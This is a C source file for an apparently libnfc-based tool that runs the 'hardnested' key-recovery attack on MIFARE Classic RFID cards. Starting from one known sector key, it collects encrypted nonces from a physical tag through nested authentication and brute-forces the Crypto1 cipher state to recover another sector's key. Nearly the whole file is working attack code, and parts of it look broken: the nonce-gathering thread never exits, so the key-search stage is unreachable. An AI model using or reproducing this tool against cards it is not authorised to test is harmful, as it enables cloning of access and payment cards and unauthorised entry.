// Copyright (C) 2016 Aram Verstegen
// GPL v2 - derives from MFOC

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <nfc/nfc.h>
#include <math.h>

#include "cmdhfmfhard.h"
#include "cmdhfmfhard_api.h"
#include "hardnested_bruteforce.h"
#include "hardnested_bf_core.h"
#include "hardnested_bitarray_core.h"
#include "crapto1.h"
#include "parity.h"

#define llu PRIu64

#define MC_AUTH_A 0x60
#define MC_AUTH_B 0x61

nfc_device* pnd;
nfc_target target;
typedef uint8_t byte_t;

uint8_t oddparity(const uint8_t bt)
{
  return (0x9669 >> ((bt ^(bt >> 4)) & 0xF)) & 1;
}

long long unsigned int bytes_to_num(uint8_t *src, uint32_t len)
{
    uint64_t num = 0;
    while (len--) {
        num = (num << 8) | (*src);
        src++;
    }
    return num;
}

uint8_t block_to_sector(uint8_t block)
{
    if(block < 128) {
        return block >> 2;
    }
    block -= 128;
    return 32 + (block >> 4);
}

static nfc_context *context;

#define MAX_FRAME_LEN 264

uint64_t *nonce_u64 = NULL;
size_t nonce_u64_collected;

enum {
    OK,
    ERROR,
    KEY_WRONG,
};

#define VT100_cleareol "\r\33[2K"

int nested_auth(uint32_t uid, uint64_t known_key, uint8_t ab_key, uint8_t for_block, uint8_t target_block, uint8_t target_key, FILE* fp)
{
    struct Crypto1State *pcs;
    uint8_t Nr[4] = { 0x00, 0x00, 0x00, 0x00 };
    uint8_t Cmd[4] = { 0x00, 0x00, 0x00, 0x00 };
    uint8_t ArEnc[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t ArEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t Rx[MAX_FRAME_LEN];
    uint8_t RxPar[MAX_FRAME_LEN];
    uint32_t Nt;
    int i;

    Cmd[0] = ab_key;
    Cmd[1] = for_block;
    iso14443a_crc_append(Cmd, 2);

    if (nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false) < 0)  {
        nfc_perror(pnd, "nfc_device_set_property_bool crc");
        return ERROR;
    }
    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool framing");
        return ERROR;
    }
    if (nfc_initiator_transceive_bytes(pnd, Cmd, 4, Rx, sizeof(Rx), 0) < 0) {
        fprintf(stdout, "Error while requesting plain tag-nonce ");
        return ERROR;
    }
    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool");
        return ERROR;
    }

    Nt = bytes_to_num(Rx, 4);
    pcs = crypto1_create(known_key);
    crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);

    for (i = 0; i < 4; i++) {
        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
    }
    Nt = prng_successor(Nt, 32);
    for (i = 4; i < 8; i++) {
        Nt = prng_successor(Nt, 8);
        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xff);
        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
    }

    if (nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool parity ");
        return 1;
    }

    int res;
    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
        fprintf(stderr, "Reader-answer transfer error, exiting.. ");
        return KEY_WRONG;
    }

    Nt = prng_successor(Nt, 32);
    if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
        fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting.. ");
        return ERROR;
    }

    Cmd[0] = target_key;
    Cmd[1] = target_block;
    iso14443a_crc_append(Cmd, 2);

    for (i = 0; i < 4; i++) {
        ArEnc[i] = crypto1_byte(pcs, 0, 0) ^ Cmd[i];
        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Cmd[i]);
    }
    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 32, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
        fprintf(stderr, "Reader-answer transfer error, exiting.. ");
        return ERROR;
    }

    if(fp){
        for(i = 0; i < 4; i++){
            fprintf(fp,"%02x", Rx[i]);
            if(RxPar[i] != oddparity(Rx[i])){
                fprintf(fp,"! ");
            } else {
                fprintf(fp,"  ");
            }
        }
        fprintf(fp, "\n");
    }
    if(nonce_u64){
        nonce_u64[nonce_u64_collected] = 0;
        for(i = 0; i < 4; i++){
            nonce_u64[nonce_u64_collected] |= ((uint64_t) Rx[i]) << (8*i);
            nonce_u64[nonce_u64_collected] |= ((uint64_t) !RxPar[i]) << (32 + (8*i));
        }
        nonce_u64_collected++;
    }

    crypto1_destroy(pcs);
    return OK;
}

uint32_t uid;
extern uint32_t cuid;
extern noncelist_t nonces[256];
uint64_t known_key;
uint8_t for_block;
uint8_t ab_key;
uint8_t target_block;
uint8_t target_key;

const nfc_modulation nmMifare = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
};

static void * update_nonce_u64_thread(void* v){
    (void)v;
    while(1){
        nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
        nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);
        if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
            nested_auth(uid, known_key, ab_key, for_block, target_block, target_key, NULL);
        } else {
            printf(VT100_cleareol "Don't move the tag!");
            fflush(stdout);
        }
    }
    return NULL;
}

static uint32_t swap_bytes(uint32_t x)
{
    return ((x & 0xFF) << 24) | ((x & 0xFF00) << 8) | ((x & 0xFF0000) >> 8) | ((x & 0xFF000000) >> 24);
}

static void add_nonce_from_u64(uint64_t nonce_u64)
{
    uint32_t nonce_enc = swap_bytes((uint32_t)(nonce_u64 & 0xFFFFFFFF));
    uint8_t par_enc = 0;
    par_enc |= (!((nonce_u64 >> 32) & 1)) << 3;
    par_enc |= (!((nonce_u64 >> 40) & 1)) << 2;
    par_enc |= (!((nonce_u64 >> 48) & 1)) << 1;
    par_enc |= (!((nonce_u64 >> 56) & 1)) << 0;
    add_nonce(nonce_enc, par_enc);
}

int main (int argc, const char * argv[]) {
    nfc_init(&context);
    pnd = nfc_open(context, NULL);

    if (pnd == NULL) {
        fprintf(stderr, "No NFC device connection\n");
        return 1;
    }

    nfc_initiator_init(pnd);

    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,false);
    nfc_device_set_property_bool(pnd,NP_INFINITE_SELECT,false);
    nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
    nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);
    nfc_device_set_property_bool(pnd,NP_AUTO_ISO14443_4, false);

    uid = 0;

    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,true);
    if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
        uid = bytes_to_num(target.nti.nai.abtUid,target.nti.nai.szUidLen);
    }

    if(!uid){
        fprintf(stderr, "No tag detected!\n");
        nfc_close(pnd);
        return 1;
    }

    if(argc < 6){
        printf("%s <known key> <for block> <A|B> <target block> <A|B>\n", argv[0]);
        nfc_close(pnd);
        return 1;
    }

    known_key = strtoull(argv[1], 0, 16);
    for_block = atoi(argv[2]);
    ab_key = MC_AUTH_A;
    if(argv[3][0] == 'b' || argv[3][0] == 'B'){
       ab_key = MC_AUTH_B;
    }
    target_block = atoi(argv[4]);
    target_key = MC_AUTH_A;
    if(argv[5][0] == 'b' || argv[5][0] == 'B'){
       target_key = MC_AUTH_B;
    }
    switch(nested_auth(uid, known_key, ab_key, for_block, target_block, target_key, NULL)){
        case KEY_WRONG:
            printf("%012"PRIx64" doesn't look like the right key %s for block %u (sector %u)\n", known_key, ab_key == MC_AUTH_A ? "A" : "B", for_block, block_to_sector(for_block));
            nfc_close(pnd);
            return 1;
        case OK:
            break;
        case ERROR:
        default:
            printf("Some other error occurred.\n");
            nfc_close(pnd);
            return 1;
    }

    char filename[21];
    sprintf(filename, "0x%08x_%03u%s.txt", uid, target_block, target_key == MC_AUTH_A ? "A" : "B");
    FILE* fp = fopen(filename, "wb");

    printf("Found tag with uid %04x, collecting nonce_u64 for key %s of block %u (sector %u) using known key %s %012"PRIx64" for block %u (sector %u)\n",
           uid, target_key == MC_AUTH_A ? "A" : "B", target_block, block_to_sector(target_block), ab_key == MC_AUTH_A ? "A" : "B", known_key, for_block, block_to_sector(for_block));
    nonce_u64_collected = 0;
    nonce_u64 = malloc(sizeof (uint64_t) <<  24);
    memset(nonce_u64, 0xff, sizeof (uint64_t) <<  24);

    pthread_t nonce_gathering_thread;
    pthread_create(&nonce_gathering_thread, NULL, update_nonce_u64_thread, NULL);
    pthread_join(nonce_gathering_thread, 0);

    if(fp){
        fclose(fp);
    }
    nfc_close(pnd);

uint32_t cuid;
    uint64_t maximum_states;
    uint8_t *best_first_bytes_ptr;
    uint32_t best_first_bytes_len;

    cuid = uid;

    init_nonce_memory();
    init_bitflip_bitarrays();
    init_part_sum_bitarrays();
    init_sum_bitarrays();

    for (size_t i = 0; i < nonce_u64_collected; i++) {
        add_nonce_from_u64(nonce_u64[i]);
    }

    check_for_BitFlipProperties(false);
    update_allbitflips_array();
    update_sum_bitarrays(EVEN_STATE);
    update_sum_bitarrays(ODD_STATE);
    update_p_K();
    apply_sum_a0();
    estimate_sum_a8();

    sort_best_first_bytes();
    get_maximum_states(&maximum_states);
    get_best_first_bytes(&best_first_bytes_ptr, &best_first_bytes_len);

    printf("Collected %zu nonces, estimated states to brute force: %" PRIu64 "\n", nonce_u64_collected, maximum_states);

    prepare_bf_test_nonces(nonces, best_first_bytes_ptr[0]);
    uint16_t sum_a0_idx = 0;
    uint16_t _first_byte_Sum = get_first_byte_Sum();
    uint16_t *_sums; uint32_t _num_sums;
    get_sums_array(&_sums, &_num_sums);
    while (sum_a0_idx < _num_sums && _sums[sum_a0_idx] != _first_byte_Sum) sum_a0_idx++;
    uint8_t sum_a8_idx;
    get_best_sum_a8_idx(&sum_a8_idx);
    generate_candidates(sum_a0_idx, sum_a8_idx);

    bool found = brute_force();

    free_bitflip_bitarrays();
    free_part_sum_bitarrays();
    free_sum_bitarrays();
    free_nonces_memory();
    free(nonce_u64);

    if (!found) {
        fprintf(stderr, "No solution found :(\n");
        return 1;
    }

    printf("Found key: %012"PRIx64"\n", get_found_key());
    printf("Tested %"llu" states\n", get_num_keys_tested());
    return 0;
}